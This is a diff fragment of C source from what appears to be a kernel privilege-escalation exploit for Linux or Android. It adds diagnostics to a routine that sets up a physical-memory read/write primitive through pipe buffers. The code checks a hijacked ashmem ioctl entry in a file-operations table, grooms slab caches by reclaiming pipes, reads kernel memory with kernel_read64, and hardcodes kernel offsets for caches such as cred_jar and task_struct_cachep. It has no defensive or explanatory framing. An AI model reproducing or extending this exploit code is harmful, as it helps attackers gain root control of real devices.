+  if (pipebuf_page_base == 0) {
+    pr_warning("phys prepare produced no page; abort before gate\n");
+    return 0;
+  }
+  ks_diag_fd("physrw post-prepare", fd);
+  ks_diag_table("physrw post-prepare");
+  {
+    uint64_t tbl_ioctl = 0;
+    uint64_t want_ioctl = (uint64_t)text_addr(ASHMEM_IOCTL);
+    int tr = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
+                               want_ioctl, &tbl_ioctl, 150);
+    if (tr < 0 || tbl_ioctl != want_ioctl) {
+      uint64_t nb1 = 0, nb2 = 0;
+      ks_fetch64(fops_table_base() + FOPS_IOCTL_OFF + 8, &nb1);
+      ks_fetch64(fops_table_base() + FOPS_IOCTL_OFF + 16, &nb2);
+      pr_warning("phys window lost payload page tbl=%llx want=%llx rv=%d "
+                 "near=%llx/%llx; abort before gate\n",
+                 (unsigned long long)tbl_ioctl, (unsigned long long)want_ioctl,
+                 tr, (unsigned long long)nb1, (unsigned long long)nb2);
+      return 0;
+    }
+  }
+  /* Content proven alive: hand the guard back its expect so the gates
+   * below keep misc.fops converged.  On the loss path above the guard
+   * stays idle (disarm is only undone here). */
+  if (guard_disarmed && guard_prev_expect) {
+    fops_guard_set_expect(guard_prev_expect);
   }
 
   uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
@@ -641,12 +1192,58 @@ int install_pipe_physrw(int fd) {
   if (!pipe_reclaim_cache_gate(fd)) {
     pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
             candidate_slab_cache, kmalloc_pipe_cache);
+    pr_info("phys step gate pages n1k=%016zx n2k=%016zx c1k=%016zx c2k=%016zx "
+            "hitslot=%d\n",
+            kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
+            kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
+            pipe_cache_slot_hit);
+    for (size_t i = 0; i < sizeof(pipe_page_slab_cache) /
+                                sizeof(pipe_page_slab_cache[0]);
+         i++) {
+      pr_info("phys step page[%zu] cache=%016zx type=%08x\n", i,
+              pipe_page_slab_cache[i], pipe_page_type[i]);
+    }
+    pr_info("phys step pipebuf_page_base=%016zx\n", pipebuf_page_base);
+    if (pipebuf_page_base != 0) {
+      uintptr_t head = direct_to_head_page(fd, pipebuf_page_base);
+      uint64_t flags = kernel_read64(fd, head + 0);
+      uint64_t meta = kernel_read64(fd, head + 0x28);
+      pr_info("phys step head=%016zx flags=%016llx meta=%016llx inuse=%u "
+              "objects=%u frozen=%d\n",
+              head, (unsigned long long)flags, (unsigned long long)meta,
+              (unsigned)(meta & 0xffffu),
+              (unsigned)((meta >> 16) & 0x7fffu),
+              (int)((meta >> 31) & 1u));
+      static const struct {
+        const char *name;
+        uintptr_t off;
+      } ident[] = {
+        {"mm_cachep", 0x2e26db0ULL},
+        {"skbuff_head_cache", 0x24fdd98ULL},
+        {"skbuff_fclone_cache", 0x24fdd90ULL},
+        {"task_struct_cachep", 0x2e26db8ULL},
+        {"cred_jar", 0x2e27ba0ULL},
+        {"filp_cachep", 0x2ab0488ULL},
+        {"dentry_cache", 0x2ab04b8ULL},
+        {"anon_vma_cachep", 0x30382c8ULL},
+        {"files_cachep", 0x2e26dd8ULL},
+        {"signal_cachep", 0x2e26dd0ULL},
+        {"sighand_cachep", 0x2e26dc8ULL},
+      };
+      for (size_t i = 0; i < sizeof(ident) / sizeof(ident[0]); i++) {
+        uint64_t ptr =
+          kernel_read64(fd, data_addr(KIMAGE_TEXT_BASE + ident[i].off));
+        int match = ptr == pipe_page_slab_cache[0];
+        pr_info("phys step ident %s=%016llx match=%d\n", ident[i].name,
+                (unsigned long long)ptr, match);
+      }
+    }
     return 0;
   }
 
   char marker[PIPE_RECLAIM];
   memset(marker, 0x61, sizeof(marker));
-  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+  for (size_t i = 0; i < pipe_reclaim_cnt; i++) {
     SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
   }
 
@@ -654,6 +1251,14 @@ int install_pipe_physrw(int fd) {
   pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
           found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
           pipe_scan_ops, pipe_scan_len);
+  pr_info("phys step first page=%016llx off=%u len=%u flags=%08x ops=%016llx "
+          "priv=%016llx want_ops=%016llx want_fl=%x q0=%016llx q1=%016llx\n",
+          (unsigned long long)pipe_scan_first_page, pipe_scan_first_offset,
+          pipe_scan_first_len, pipe_scan_first_flags,
+          (unsigned long long)pipe_scan_first_ops,
+          (unsigned long long)pipe_scan_first_private,
+          (unsigned long long)pipe_buf_ops_addr(), PIPE_BUF_FLAG_CAN_MERGE,
+          (unsigned long long)pipe_scan_q0, (unsigned long long)pipe_scan_q1);
   if (!found) {
     return 0;
   }
